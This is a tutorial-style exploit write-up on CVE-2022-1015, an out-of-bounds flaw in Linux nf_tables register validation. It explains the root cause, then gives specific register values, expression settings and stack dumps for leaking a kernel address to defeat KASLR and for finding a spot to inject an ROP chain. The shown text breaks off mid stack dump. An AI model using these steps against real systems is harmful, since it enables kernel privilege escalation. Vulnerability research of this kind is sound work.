## Introduction
Hello there! Today we will be reviewing and exploring a vulnerability in the Linux kernel framework Netfilter.

This is meant to be a *write-up* as much as it is meant to be educational material for the people just getting into the kernel vulnerability research space. I attempt to go over everything and not leave anything unexplained so it can be accessible to everyone - including those with little to no experience in vulnerability research. However, knowledge of Linux, assembly and C is implied. 

I recommend reading my article [Dissecting the Linux Firewall: Introduction to Netfilter's nf_tables](https://ysanatomic.github.io/netfilter_nf_tables/) before undertaking this write-up so you have a general idea of the internals of nf_tables. 

When I decided that I want to explore and review vulnerabilities in the Netfilter framework I came across [David Bouman's](https://twitter.com/pqlqpql) [write-up](https://blog.dbouman.nl/2022/04/02/How-The-Tables-Have-Turned-CVE-2022-1015-1016/) of this very vulnerability. 
As the vulnerability proved quite interesting I decided to also do a write-up reviewing it in **more** detail as well as go through the process of developing the exploit for it **more** in-depth. My article can be quite similar to his at some times but also diverges greatly at others - namely in the exploitation stage.

The write-up is based on my notes that I was taking while exploring the vulnerability and trying to exploit it so there might be parts where I take the wrong way or talk about the things I missed or did incorrectly at first before figuring it out. I decided to leave those parts in the write-up as they can prove to be educational. 

## Table of Contents
1. [The Vulnerability](#vuln)
	+ [Root cause](#rootcause)
	+ [Parser Functions](#parserfunc)
	+ [Register translation](#regtranslation)
	+ [Validation functions](#validationfunc)
	+ [A big "but"](#bigbut)
2. [Exploitation](#exploitation)
	+ [Primitives?](#primitives)
		- [nft_immediate_expr](#imm)
		- [nft_payload](#payload)
		- [nft_payload_set](#payloadset)
		- [nft_bitwise](#bitwise)
	+ [An Exploitation strategy](#explstrat)
	+ [Leaking a kernel address](#leakingkaddr)
		- [nft_do_chain](#nft_do_chain)
		- [Scouting for a kernel address](#scoutingkaddr)
		- [Leaking the address](#leakingkaddr)
	+ [Road to Code Execution](#ceroad)
		- [Output hook + UDP packet](#outputudp)
		- [Trying the other hooks](#otherhooks)
		- [Exploitation vector through TCP](#expltcp)
	+ [Building an ROP chain](#ropchain)
		- [prepare_kernel_cred](#prepare_kernel_cred)
		- [commit_creds](#commit_creds)
		- [switch_task_namespaces](#switch_task_namespaces)
		- [swapgs_restore_regs_and_return_to_usermode](#swapgs)
		- [Summarizing the ROP chain](#summ)
3. [Proof-of-Concept](#poc)
4. [Closing Remarks](#closing)

## The Vulnerability <a name="vuln"></a>
The vulnerability is in `nf_tables` portion of the netfilter framework. The exact description for CVE-2022-1015 is:
>A flaw was found in the Linux kernel in linux/net/netfilter/nf_tables_api.c of the netfilter subsystem. This flaw allows a local user to cause an out-of-bounds write issue.

I will again recommend reading my article providing an introduction to *nf_tables* as it provides a good base to be able to understand the vulnerability.

### Root cause <a name="rootcause"></a>
The root cause of the vulnerability is in the functions `nft_validate_register_store` and `nft_validate_register_load`. They validate that register indexes and data that is to be written(stored) or read(loaded) is within bounds of the registers. 
However, before we take a look at them we will first take a look at the **parsing** functions - `nft_parse_register_store` and `nft_parse_register_load` which call the two validating functions.

#### Parser functions <a name="parserfunc"></a>
The parsing functions are responsible for *parsing* values from netlink attributes to register indexes and calling the validation functions.
```c
/* net/netfilter/nf_tables_api.c */
int nft_parse_register_load(const struct nlattr *attr, u8 *sreg, u32 len)
{
	u32 reg; // 4 byte register variable
	int err;

	reg = nft_parse_register(attr); // gets the register index from an attribute
	err = nft_validate_register_load(reg, len); // calls the validating function
	if (err < 0) // if the validating function didn't return an error everything is fine
		return err;

	*sreg = reg; // save the register index into sreg (a pointer that is provided as an argument)
	// sreg = source register -> the register from which we read
	return 0;
}
EXPORT_SYMBOL_GPL(nft_parse_register_load);

int nft_parse_register_store(const struct nft_ctx *ctx,
			     const struct nlattr *attr, u8 *dreg,
			     const struct nft_data *data,
			     enum nft_data_types type, unsigned int len)
{
	int err;
	u32 reg; // 4 byte register variable

	reg = nft_parse_register(attr); // parsed from an attribute
	err = nft_validate_register_store(ctx, reg, data, type, len);
	/* here we pass a bit more arguments to the validating function */
	/* because we are going to be writing into the registers and not reading from them */
	if (err < 0)
		return err;

	*dreg = reg; // once again saves the register index into dreg
	// dreg = destination register -> the register in which we write
	return 0;
}
```

In the code above the `reg` variable is `u32`, 32-bit integer, while the `sreg` and `dreg` pointers are for `u8` variables, so they are 8-bit. This of course makes sense if you know how the registers work. The total register space is `0x50 = 80` bytes. So there is no reason to save more than the least significant byte after validation - if the register index is in-bounds it should always fit in those 8-bits.

#### Register translation <a name="regtranslation"></a>
Now before we go into detail on the validation functions let's first look at the register offsets and the enum type that we have. This section could be skipped if you have a really good understanding of how register offsets are handled and translated in netfilter. However, I recommend reading as it will be important later on. 

So if you have read my article on `nf_tables` you should know that there are two types of register offsets for the data section of the registers. There used to be only four 16-byte registers. Then those registers turned into sixteen 4-byte ones. However, due to compatibility reasons, the 16-byte register offsets also stayed. So the registers can be viewed as a single buffer with two types of offsets.

![regs_schematic.png](https://i.imgur.com/93aKEAi.png)

```c
enum nft_registers {
	NFT_REG_VERDICT,
	NFT_REG_1,
	NFT_REG_2,
	NFT_REG_3,
	NFT_REG_4,
	__NFT_REG_MAX,

	NFT_REG32_00	= 8,
	NFT_REG32_01,
	NFT_REG32_02,
	...
	NFT_REG32_13,
	NFT_REG32_14,
	NFT_REG32_15,
};
```
Taking a look at the enum type we can see how both types of offsets exist in it. `NFT_REG_VERDICT` points to zero and `NFT_REG_1` to `NFT_REG_4` point to indexes from one to four.
We see how `NFT_REG32_00` is defined as eight so `NFT_REG32_01` is nine and so on and so forth. 

So now what happens is a translation in the `nft_parse_register` function.
```c
/* net/netfilter/nf_tables_api.c */
/**
 *	nft_parse_register - parse a register value from a netlink attribute
 *
 *	@attr: netlink attribute
 *
 *	Parse and translate a register value from a netlink attribute.
 *	Registers used to be 128 bit wide, these register numbers will be
 *	mapped to the corresponding 32 bit register numbers.
 */
static unsigned int nft_parse_register(const struct nlattr *attr)
{
	unsigned int reg;

	// from include/uapi/linux/netfilter/nf_tables.h
	// NFT_REG_SIZE = 16 (16 bytes)
	// NFT_REG32_SIZE = 4 (4 bytes)
	reg = ntohl(nla_get_be32(attr));
	switch (reg) {
	case NFT_REG_VERDICT...NFT_REG_4:
		return reg * NFT_REG_SIZE / NFT_REG32_SIZE; 
	default:
		return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00;
	}
}
```
If the register that is parsed through a netlink attribute is between the values `NFT_REG_VERDICT...NFT_REG_4` (between the values zero and four) it does a calculation which returns the register index as `reg * 16 / 4`  or `reg * 4`. 

So it just scales up the register index with a factor 4 if the old registers were used. That makes sense as the old registers were 16-byte ones and the new ones are 4-byte ones - so `NFT_REG_2` corresponds to `NFT_REG32_07` (not `NFT_REG32_08` as the 4-byte register offsets start from `00`). 

This is when the old register offsets are used. However when the new register offsets are used - the 4-byte ones - another calculation is performed. That calculation is meant to align the number from the enum to the actual register index - because in the enum type the 4-byte register offsets are themselves offset by eight - `NFT_REG32_00` maps to 8. 

So the calculation yields that the true register index is `reg + 16 / 4 - 8` which is `reg - 4`.

So the true register index of `NFT_REG32_00` is actually `8-4 = 4`. Why four you might ask? Well, there is a verdict register that sits at the beginning of the registers which is 16 bytes wide and that is the size of four 4-byte registers so the first data register starts actually from four and not zero.

Extremely confusing, I know - but this is what we deal with. Now we can take a look at the validation functions.

#### Validation functions <a name="validationfunc"></a>
We will take a look at only one of them as the vulnerability is the same in both.
```c
/* net/netfilter/nf_tables_api.c */
int nft_validate_register_load(enum nft_registers reg, unsigned int len)
{
	if (reg < NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)
		/* NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE is 1 * 16 / 4 = 4
		/* this check is essentially reg < 4 */
		/* this essentially checks if you are reading the verdict */
		/* the verdict is located at reg offsets 0 to 4 */
		/* if attempting to load the verdict it returns an EINVAL */
		return -EINVAL;
	if (len == 0) // if trying to read with len = 0, return EINVAl - makes sense
		return -EINVAL;
	if (reg * NFT_REG32_SIZE + len > sizeof_field(struct nft_regs, data))
		/* NFT_REG32_SIZE = 4 */
		/* sizeof_field(struct nft_regs, data) gets the size of the registers */
		/* the size of the registers in total is 0x50 = 80 */
		/* reg * 4 + len > 0x50 */ 
		/* This rule is to make sure we are not loading and storing */
		/* outside of the registers */
		/* going outside of the registers would be dangerous as */
		/* the registers are on the stack so reading or writing outside of them */
		/* would be directly writing out-of-bounds on the stack in **kernel-space** */
		/* if going OOB it returns an ERANGE error */
		return -ERANGE;
	
	return 0;
}
```
You might have spotted the vulnerability in the last if-statement.

`if (reg * NFT_REG32_SIZE + len > sizeof_field(struct nft_regs, data))`

The constant `NFT_REG32_SIZE` is 4. If we pass a big enough value for reg such that when multiplied by 4 and `len` added we could overflow the integer. That would allow for very high values of `reg` to pass the check when they normally wouldn't.

Let us look at an example. If we **assume** `reg` to be a 32-bit integer as it is in `nft_parse_register_load` then the maximum value we could pass for `reg` is `0xffffffff` - four bytes of `0xff`. With a such value of reg if we multiply it by four we would get a value of `0x3FFFFFFFC` which is more than four bytes. In this case only the lower four bytes will be taken during the next computation. 

Let's say we have a value of `len = 0x20` then at the end of the computation in the if-statement our value would be `0xfffffffc + 0x20 = 0x10000001C`. Again that value is more than 4 bytes so only the lower four would be taken and that would leave the total value at the end at `0x1c`. The check would evaluate to `0x1c < 0x50` which means that no error would be returned so the register value we pass (`0xffffffff`) would be validated as a *valid* one even though it is not. 

If you remember in `nft_parse_register_load` and `nft_parse_register_store` in `dreg` and `sreg` is saved only the least significant bit (due to `dreg` and `sreg` being of type u8). So that means that at the end `sreg` or `dreg` would be just `0xff`. That is still out of the bounds of `nft_regs` which is `0x50` bytes. 

That would mean that we could potentially read and write out of the bounds of `nft_regs` directly on the stack. 

Even though I just used `0xffffffff` as an example value that at the end evaluates at `0xff` - the highest value that could reach the validation function is `0xfffffffb` due to how the registers are parsed. We took a look at that already but let's go over it again.

In the enum type, the 16-byte registers hold values from 1 to 4. Everything higher than that is considered a 4-byte register and when those are evaluated 4 is subtracted from them to align them correctly. You might want to go back to that section to re-read it if something is unclear.

That means that if we pass `0xffffffff` it would be decreased by 4 before it even reaches the validation function so reg by that point would be equal to `0xfffffffb`. As only the lowest byte of that would be taken for the actual register value - the register we will have is `0xfb`. That is true for all register values that we pass higher than `4`. This would mean that the highest register index we can get is `0xfb`. 

However, there is a way to reach the register values from `0xfc` to `0xff`. Until now we used the base `0xffffffXX` for the register values we pass but we could also use `0x3fffffXX` and `0x7fffffXX`. If we use a lower base - for example, `0x3fffffXX` - we could pass a value like `0x40000003` that when decreased by 4 will be equal to `0x3fffffff`. When the least-significant byte is taken it evaluates to register index `0xff`. That's how we reach the highest register indexes. 

> In all future mentions of register indexes -> the register index refers to the REAL index (after they are decreased by 4).

#### A big "but" <a name="bigbut"></a>
But all of that is under the assumption that the register that reaches the validation function is indeed 32bit. And that might not be true. The parameter of the function is of type `enum nft_registers`. By default, enum should be guaranteed to hold integer values(32bit). However, an optimization might be active that makes the size of the enums big enough to only hold the values provided in the definition of the enum. If that optimization is active that would mean our `enum nft_registers` would be of size char (1 byte). In that case, only the least-significant byte would reach the faulty validation - complicating things. 

There is no information showing if that optimization is active by default in the kernel.
So the only way to say is to look at the assembly of the validation function. Let's do that.
```assembly
; nft_parse_register_load - kernel built from source at tag 5.12
0xffffffff81a6c870 <+0>:	call   0xffffffff81065160 <__fentry__>
0xffffffff81a6c875 <+5>:	mov    eax,DWORD PTR [rdi+0x4]
0xffffffff81a6c878 <+8>:	bswap  eax
0xffffffff81a6c87a <+10>:	mov    edi,eax
0xffffffff81a6c87c <+12>:	lea    ecx,[rax-0x4]
0xffffffff81a6c87f <+15>:	shl    edi,0x4
0xffffffff81a6c882 <+18>:	shr    edi,0x2
0xffffffff81a6c885 <+21>:	cmp    eax,0x4
0xffffffff81a6c888 <+24>:	mov    eax,edi
0xffffffff81a6c88a <+26>:	cmova  eax,ecx
0xffffffff81a6c88d <+29>:	test   edx,edx
0xffffffff81a6c88f <+31>:	je     0xffffffff81a6c8a3 <nft_parse_register_load+51>
0xffffffff81a6c891 <+33>:	cmp    eax,0x3
0xffffffff81a6c894 <+36>:	jbe    0xffffffff81a6c8a3 <nft_parse_register_load+51>
0xffffffff81a6c896 <+38>:	lea    edx,[rdx+rax*4]
0xffffffff81a6c899 <+41>:	cmp    edx,0x50
0xffffffff81a6c89c <+44>:	ja     0xffffffff81a6c8a9 <nft_parse_register_load+57>
0xffffffff81a6c89e <+46>:	mov    BYTE PTR [rsi],al
0xffffffff81a6c8a0 <+48>:	xor    eax,eax
0xffffffff81a6c8a2 <+50>:	ret    
0xffffffff81a6c8a3 <+51>:	mov    eax,0xffffffea
0xffffffff81a6c8a8 <+56>:	ret    
0xffffffff81a6c8a9 <+57>:	mov    eax,0xffffffde
0xffffffff81a6c8ae <+62>:	ret    
```
If we take a look at `<+38>` and the few instructions below we can see that this is the generated assembly of the vulnerable if-statement.

We can see that in my case the nft register index is in the `rdx register`. We can see that the full `rdx` register is used in the calculation and the result is saved into the lower 32 bits (`edx`). Then `edx` is compared to `0x50`. This clearly shows that the register size in the function is not shrunk by `enum` optimization. 


## Exploitation <a name="exploitation"></a>
Now that it is clear that no optimization is in our way we can take a look at how we could potentially exploit this.

In order to be able to exploit this we would need to be able to create and modify `nf_tables` objects - tables, chains, etc. To do that we need the capability `CAP_NET_ADMIN`. Thankfully we can obtain it in a user+network namespace. We will just have to make sure to leave the namespace during exploitation.

This vulnerability is essentially an incorrect validation. This allows us to set values for the registers such that we are going to be accessing addresses on the stack outside of `nft_regs`. Allowing Out-Of-Bounds Read and Write which can lead to an Arbitrary Code Execution in kernel-space.

### Primitives? <a name="primitives"></a>
It is time to look into what our primitives are. All the expressions use the registers in some way - either by reading from them or writing to them. Now the question is about looking for the ones most useful to help us exploit this vulnerability.

#### nft_immediate_expr <a name="imm"></a>
This one writes constant data to the registers. So on theory it could be used if we want to use it for an OOB write.

However with this expression we can only write up to 16 bytes which is not ideal and that constraint of 16 bytes would also restrict us severely on the values the register value we pass could hold. 

The minimal value we could pass for the register that it still goes through the validation successfully is `0xfffffffc` which is **very** restrictive.

#### nft_payload <a name="payload"></a>
The `nft_payload` expression is used to copy directly from the packet to the registers. This is a perfect expression for an OOB read. We can read up to `0xff` at once which is the most we can get from any expression. Let's find out our lower and upper bounds. 

Our lower bound is whenever we *max out* our len at `0xff`. The minimal register value then we can have to pass the validation condition is `0xffffffc1`. That means the lowest offset we can read at is `0xc1 * 4 = 0x304` relative to the beginning of `nft_regs` on the stack.  

Our upper bound is when our register value is the highest possible `0xff`. At that register value, the highest length we could have is `0x54` at which `0x3fffffff * 4 + 0x54 = 0x50 <= 0x50`. This means that the highest offset we can read at is `0xff * 4 + 0x54 = 0x450`. 

So the lowest offset at which we could read is `0x304` and the highest at which we could read is `0x450`. That leaves us with `0x14c = 332` bytes we can read from the stack.

#### nft_payload_set <a name="payloadset"></a>
The `nft_payload_set` does the opposite of the `nft_payload`. Instead of copying from the packet to the registers - this expression can be used to copy from the registers and write onto the packet. It has the same bounds as `nft_payload`.
```c
struct nft_payload_set {
	enum nft_payload_bases	base:8;
	u8			offset;
	u8			len;
	u8			sreg;
	u8			csum_type;
	u8			csum_offset;
	u8			csum_flags;
};
```
The thing different is that it takes a source register `sreg` instead of a destination register `dreg`. It also has some checksum options but they are not relevant to us.

#### nft_bitwise <a name="bitwise"></a>
This expression is used to perform *bitwise* operations on the registers.
```c
struct nft_bitwise {
	u8			sreg;
	u8			dreg;
	enum nft_bitwise_ops	op:8;
	u8			len;
	struct nft_data		mask;
	struct nft_data		xor;
	struct nft_data		data;
};
```
It takes a `sreg` and `len` which specify to what registers we are going to be performing the bitwise operations. The destination `dreg` specifies where we are going to be putting the data from the registers we are performing the bitwise operation to.

The `op` parameter of type `nft_bitwise_ops` specifies the type of a bitwise operation.	You can read all about the types in my article on `nf_tables` but here we will review only the one that concerns us.

We will be using this expression to copy from register to register without performing *any* bitwise operation. We are going to use it in case we need to copy some data from out-of-bounds 'registers' to the actual registers. To do this we are going to use either `ops` set to `NFT_BITWISE_LSHIFT` or `NFT_BITWISE_RSHIFT` and pass a zero as the data (here the data is the amount of byte we shift by).  

What are our bounds when we use this expression?

Here the boundaries are a bit different. Our max length cannot be `0xff` because if it is then both our `sreg` and `dreg` would be out-of-bounds which we don't want. So our length must be `0x40 = 64` at the maximum (16 data registers each 4 bytes).

Our lower bound would then be when we barely cross the threshold of validity but our len is the maximum we could have - `0x40`. This means that our lower bound would be when our register value is `0xfffffff0` - because `0xfffffff0 * 4 + 0x40 = 0x00 < 0x50`. Converted to byte offset that would be `0xf0 * 4 = 0x3c0` relative to the beginning of `nft_regs`.

Our upper bound would be when we have set our length to the maximum - `0x40`. The highest value for a register we can have is `0xff`. In that case `0x3fffffff * 4 + 0x40 = 0x3c < 0x50`. Coverted to a byte offset that is `0xff * 4 + 0x40 = 0x43c`. 

So in total we could read from offset `0x3c0` to offset `0x43c` with this expression - `0x7c = 124` bytes range.

Those are all of the expressions needed to exploit this vulnerability.

### An Exploitation strategy <a name="explstrat"></a>
The exploitation strategy is pretty simple. The netfilter hook we use for our chain and the protocols we choose for the packets going through the firewall all change the stack layout. This means that if the stack layout is not favourable at our OOB read and write range we can experiment a lot with hooks and protocols until we have a favourable stack layout to do what we need to do. So our strategy is essentially:
- Find a good hook and protocol such that there is a kernel address in our OOB read range.
- Leak the address and calculate the kernel base.
- Find a good hook and protocol such that the stack layout at our OOB write range is good enough for us to be able to inject a full ROP chain on the stack.
- Build an ROP chain and inject it... voilà.

### Leaking a kernel address <a name="leakingkaddr"></a>
The first stage of exploitation is to find a way to leak a kernel address to find the kernel base. It is essential that we find the kernel base address in order to actually exploit the vulnerability. Due to "Kernel Address Space Layout Randomization" (`KASLR`) the kernel is loaded at a different address in memory each time (at boot). In order to use an ROP chain we need to know the base address to calculate the addresses the ROP gadgets will be located at. Thankfully due to the fact that we have an OOB read we have a very good chance of leaking a kernel address and defeating `KALSR`.

#### nft_do_chain <a name="nft_do_chain"></a>
If you have read the article on nf_tables you know that `nft_do_chain` is executed to go through the rules in a chain and execute their expressions whenever a hook is 'triggered'. 

Looking at the generated assembly of `nft_do_chain` we need to locate instructions accessing the registers to determine where on the stack the registers are. 
```assembly 
0xffffffff81a6bb40 <+0>:     call   0xffffffff81065160 <__fentry__>
0xffffffff81a6bb45 <+5>:     push   rbp
0xffffffff81a6bb46 <+6>:     mov    rbp,rsp
0xffffffff81a6bb49 <+9>:     push   r15
0xffffffff81a6bb4b <+11>:    mov    r15,rdi
0xffffffff81a6bb4e <+14>:    push   r14
0xffffffff81a6bb50 <+16>:    push   r13
0xffffffff81a6bb52 <+18>:    push   r12
0xffffffff81a6bb54 <+20>:    push   rbx
0xffffffff81a6bb55 <+21>:    and    rsp,0xfffffffffffffff0
0xffffffff81a6bb59 <+25>:    sub    rsp,0x1a0
0xffffffff81a6bb60 <+32>:    mov    rax,QWORD PTR [rdi+0x20]
0xffffffff81a6bb64 <+36>:    mov    QWORD PTR [rsp+0x8],rsi
0xffffffff81a6bb69 <+41>:    mov    rax,QWORD PTR [rax+0x20]
0xffffffff81a6bb6d <+45>:    mov    BYTE PTR [rsp+0x4d],0x0
0xffffffff81a6bb72 <+50>:    movzx  eax,BYTE PTR [rax+0xe94]
0xffffffff81a6bb79 <+57>:    mov    BYTE PTR [rsp+0x13],al
0xffffffff81a6bb7d <+61>:    nop    DWORD PTR [rax+rax*1+0x0]
0xffffffff81a6bb82 <+66>:    mov    rax,QWORD PTR [rsp+0x8]
0xffffffff81a6bb87 <+71>:    mov    DWORD PTR [rsp+0x14],0x0
0xffffffff81a6bb8f <+79>:    mov    QWORD PTR [rsp+0x18],rax
0xffffffff81a6bb94 <+84>:    cmp    BYTE PTR [rsp+0x13],0x0
0xffffffff81a6bb99 <+89>:    mov    rax,QWORD PTR [rsp+0x18]
0xffffffff81a6bb9e <+94>:    je     0xffffffff81a6be90 <nft_do_chain+848>
0xffffffff81a6bba4 <+100>:   mov    r12,QWORD PTR [rax+0x8]
0xffffffff81a6bba8 <+104>:   mov    rax,QWORD PTR [r12]
0xffffffff81a6bbac <+108>:   mov    DWORD PTR [rsp+0x50],0xffffffff ; regs.verdict.code = NFT_CONTINUE;  
0xffffffff81a6bbb4 <+116>:   mov    rbx,QWORD PTR [r12]
0xffffffff81a6bbb8 <+120>:   test   rbx,rbx
...
0xffffffff81a6bc93 <+339>:   mov    r8d,DWORD PTR [rsp+0x50]
0xffffffff81a6bc98 <+344>:   cmp    r8d,0xffffffff
0xffffffff81a6bc9c <+348>:   jne    0xffffffff81a6c039 <nft_do_chain+1273> 
...
```
The instruction of importance is at `<+108>`. Let's take a deeper look at it.

At the beginning of `do_chain` in `nft_do_chain` there is this line of code
`regs.verdict.code = NFT_CONTINUE;`  
You probably know that `NFT_CONTINUE` is the default verdict code.
```c
enum nft_verdicts {
	NFT_CONTINUE	= -1, // -1 is 0xffffffff due to Two's Complement
	NFT_BREAK	= -2,
	NFT_JUMP	= -3,
	NFT_GOTO	= -4,
	NFT_RETURN	= -5,
};
```
So this instruction at `<+108>` sets the verdict register to `NFT_CONTINUE`.

The verdict register is the first register - sitting at the very start. If it is located at `rsp+0x50`. 
That means that the register occupies the space on the stack from `rsp+0x50` to `rsp+0xa0`.

Also looking at the instructions at `<+339>` and `<+344>` we can see the check validating that the verdict is still `NFT_CONTINUE`.

```
gdb-peda$ x/20xw ($rsp+0x50) // printing the registers -> we print 20 words (20 (4 byte) words is 80 bytes = 0x50)
0xffffc90000003c50:     0xffffffff      0x00000000      0x00000000      0x00000000
0xffffc90000003c60:     0x00000011      0xffffffff      0x8105ceac      0xffffffff
0xffffc90000003c70:     0x8117f965      0xffffffff      0xffffffff      0x7fffffff
0xffffc90000003c80:     0x00000006      0x00000000      0x3a61cec0      0xffff8880
0xffffc90000003c90:     0x00000001      0x00000000      0x00011795      0x00000000
```

Now we know where on the stack the `nft_regs` are located.

#### Scouting for a kernel address <a name="scoutingkaddr"></a>
We already have established that we can do an OOB read and write with `nft_bitwise`. Using this expression will allow us to copy data from the OOB range and put it into our registers. Then we could use a `nft_payload_set` to get the data we saved into the registers and put it into a packet. Once it is in the packet we can listen for it - and read the leaked data.

> A small note: It is not necessary to use both nft_bitwise and nft_payload_set. You could just use nft_payload_set to directly copy it from the OOB range into the packet. However, when I was writing the exploit I chose to use first `nft_bitwise` and then `nft_payload_set`.


We know that with `nft_bitwise` we can leak from offset `0x3c0` to offset `0x43c` - that's 15 and a half 8-byte words range.

Now let's take a look at the stack layout when we set up a chain with an **output hook** (`NF_INET_LOCAL_OUT`) and use a **UDP** packet. Using an output hook means that the rules and expressions we set will be executed right before the packet leaves the nest. We will use a **UDP** packet as it is the most simple one and a one-off - doesn't need a connection like a TCP one.

```
gdb-peda$ x/16gx ($rsp+0x50+0x3c8)
0xffffc90000227d78:     0x0000000000000008      0xffff8880052dd680
0xffffc90000227d88:     0x0000000000000004      0x0000000000000000
0xffffc90000227d98:     0xffffffff819bfc63      0xffff88800e1db180
0xffffc90000227da8:     0xdd4d4cb9a478c900      0xffff88800e1db180
0xffffc90000227db8:     0xffffc90000227df8      0xffff88800e1db180
0xffffc90000227dc8:     0x0000000000000010      0x0000000000000004
0xffffc90000227dd8:     0x0000000000000000      0xffffc90000227e28
0xffffc90000227de8:     0xffffffff819b7ab7      0xffffffff819b7ab7
```
The address saved at `0xffffc90000227d98` immediately stands out as it is obviously a `.text` address. This serves us perfectly. It is at offset `0x3e8` relative to the beginning of `nft_regs`. 


#### Leaking the address <a name="leakingkaddr"></a>

Leaking the address is straightforward now. We have a `.text` address ready to be leaked in our OOB read range when we use an *output hook* and send a UDP packet to ourselves on the loopback interface. Now we need to construct a rule with the proper expressions. First, we copy the address from the OOB range to the registers. Then we need to copy the address from the registers and write it to the UDP packet's payload. And finally, we just need to be listening for UDP packets so we can receive back the packet carrying the address.  

To do that we need to make a rule with the following expressions:
- bitwise expression
	+ sreg = 0xffffff(fe) (0x3e8 / 4 = 0xfa but it will be decreased by 4 so we will add 4 preemptively 0xfa + 4 = 0xfe) 
	+ dreg = NFT_REG32_01
	+ len = 0x20 (length is bigger than needed to pass the validation)
	+ bitwise_shift_type = NFT_BITWISE_RSHIFT or NFT_BITWISE_LSHIFT
	+ data = 0 (shift value must be 0)
- payload_set expression 
	+	sreg = NFT_REG32_01
	+ base = NFT_PAYLOAD_TRANSPORT_HEADER (this base is targetting the UDP header)
	+ offset = 8 (the UDP header is 8 bytes, we want to be writing right after it - where the payload is) 
	+ len = 8 (the address is 8 bytes)

Those expressions make a rule that is added to the output chain. 
For the sake of reducing noise, I also added an expression of type `nft_cmp_expr` at the beginning of the rule to check the destination port before performing the other expressions. That would make sure we are not writing to some other UDP packet. 

After we have set up the rule the only thing left is to spin up a UDP listener and send a UDP packet with an 8-byte payload - the address is going to be written over the 8-byte payload. Then we receive the packet and read the address from it.

Now that we have defeated `KASLR` it is time we move towards our goal - gaining kernel-space code execution and achieving Local Privilege Escalation.

### Road to Code Execution <a name="ceroad"></a>
Now that we have figured out how to leak the kernel address we need to figure out how to achieve Arbitrary Code Execution.

When we talked about primitives we established that `nft_payload` is the best expression for OOB write as we can write up to `0xff` bytes - 32 eight-byte words.

Ideally, we want to be able to write at least 20-something words on the stack without crashing. In reality, this is a bit more difficult than it seems.

#### Output hook + UDP packet <a name="outputudp"></a>
Let us look more closely at the stack layout when using an output chain and a UDP packet. We found a `.text` address at a nice location there so maybe if it is a saved return address we could inject an ROP chain at that location.

```
gdb-peda$ x/40gx ($rsp+0x50+0x308)
0xffffc90000227cb8:     0x0000000000000000      0x0000000000000000
0xffffc90000227cc8:     0x0000000000000000      0x000000000100007f
0xffffc90000227cd8:     0x0000000000000000      0x00000000ffff0000
0xffffc90000227ce8:     0x0000000000000000      0x0000000100000001
0xffffc90000227cf8:     0x0011000000000000      0x0000000000000001
0xffffc90000227d08:     0x0000000000000000      0x0000000000000000
0xffffc90000227d18:     0x0100007f0100007f      0xffff8880699c55c3
0xffffc90000227d28:     0x0000000000000000      0x0000000000000000
0xffffc90000227d38:     0x000000100000ffff      0x0000000000000000
0xffffc90000227d48:     0x00008800ffff0000      0x0000000000000000
0xffffc90000227d58:     0x0000ee4700000000      0x0000000000000000
0xffffc90000227d68:     0xffff8880052d0480      0xffff8880052d0508
0xffffc90000227d78:     0x0000000000000008      0xffff8880052d0480
0xffffc90000227d88:     0x0000000000000004      0x0000000000000000
0xffffc90000227d98:     0xffffffff819bfc63      0xffff88800e233c00
0xffffc90000227da8:     0x3175125abbd91100      0xffff88800e233c00
0xffffc90000227db8:     0xffffc90000227df8      0xffff88800e233c00
0xffffc90000227dc8:     0x0000000000000010      0x0000000000000004
0xffffc90000227dd8:     0x0000000000000000      0xffffc90000227e28
0xffffc90000227de8:     0xffffffff819b7ab7      0xffffffff819b7ab7
```

Looking at the stack right after the address we leaked we see that at location `0xffffc90000227da8` there is an obvious stack canary.

We have `.text` addresses at `0xffffc90000227de8` and `0xffffc90000227df0`. Let's look at what offsets they are. The first one is `0x438` bytes away from the start of nft_regs and the other one is `0x440`. That makes them outside of our OOB write range. 

So obviously the *output hook* is not an option in our case.

#### Trying the other hooks <a name="otherhooks"></a>
After it became obvious that the **output hook** cannot be used on this kernel built I started looking into other hooks. I tried the **input hook**, **prerouting hook**, **postrouting hook** - all without the **ingress** and **forward** hooks. After reviewing the stack on all of them I realised none of them have a favourable stack layout (using UDP packets). This was quite disappointing as I had invested a lot of time attempting to do it using UDP packets on the different hooks. 

On the **prerouting hook** I even attempted to split the ROP chain around the stack canary and jump between the *two* ROP chains - but that also did not work as I could not pass the validation while keeping the length low enough as to not overwrite the stack canary.

After having spent a lot more time than I should have trying to make it work on one of the hooks I decided to look into the stack layout when TCP packets go through the rules.

#### Exploitation vector through TCP <a name="expltcp"></a>
One of the reasons I worked so hard to make it work with UDP rather than attempting TCP earlier was because TCP requires a connection to be initiated and that is an extra burden we have to deal with. 

Another reason I had to avoid TCP is the fact that the stack might differ between different TCP packets due to different flags being set in their headers. And indeed I observed this behaviour. It could also be viewed as a positive rather than a negative - the more different stack layouts we can get the better the chance that one might be exploitable.

First I attempted of course the output hook. I used a normal `SOCK_STREAM` socket. Debugging I realised that the stack layout when sending a data packet is not favourable. However, I saw something very interesting... The stack layout looked favourable when the **ACKnowledgement** packet of the connection initialization was being handled. 

Now the obvious next step is to include the payload in the **ACK** packet that is sent during initialization. To do that I had to use **raw sockets** and build manually the headers for the **SYN** and **ACK** packet. That allowed me to include a payload to the **ACK** packet where I wouldn't be able to do that via a `SOCK_STREAM` socket.

Weirdly the stack layout changed when using a raw socket - it did not look as it did when I was using a normal `SOCK_STREAM` socket. That was weird... however it wasn't an obstacle as the new stack layout was also vulnerable. Let's take a look at it.

```
gdb-peda$ x/42gx ($rsp+0x50+0x308)
0xffffc90000237d78:     0x0000000000000001      0xffffea0000086d40
0xffffc90000237d88:     0x0000000000000000      0x0000000000000000
0xffffc90000237d98:     0x0000000000000000      0x0000000000000000
0xffffc90000237da8:     0x885b22be57fdfb00      0xffff88800e266e00
0xffffc90000237db8:     0xffffc90000237df8      0xffff88800e266e00
0xffffc90000237dc8:     0x0000000000000010      0x0000000000000006
0xffffc90000237dd8:     0x0000000000000000      0xffffc90000237e28
0xffffc90000237de8:     0xffffffff819b7ab7      0xffffffff819b7ab7
0xffffc90000237df8:     0x0000000000000000      0x00007f1e7f701df0
0xffffc90000237e08:     0xffffffff819b99c8      0x0000000100000000
0xffffc90000237e18:     0x00007f1e78002bc0      0x00000000000000f4
0xffffc90000237e28:     0xffffc90000237e88      0xffff888000000010
0xffffc90000237e38:     0x0000000000000005      0x0000000000000000
